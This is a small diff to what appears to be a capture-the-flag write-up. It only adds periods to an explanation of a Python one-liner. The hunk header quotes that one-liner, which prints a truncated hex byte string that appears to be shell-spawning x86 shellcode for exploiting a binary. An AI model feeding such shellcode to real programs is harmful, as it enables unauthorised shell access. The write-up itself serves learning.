@@ -199,9 +199,9 @@ python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x
 ```
 
 **Explanation:**
-- `python`				: launches the Python interpreter
-- `-c` 					: executes the command passed as a string
-- `print` 				: outputs data to standard output
+- `python`				: launches the Python interpreter.
+- `-c` 					: executes the command passed as a string.
+- `print` 				: outputs data to standard output.
 
 ## 4. Get The Flag
 
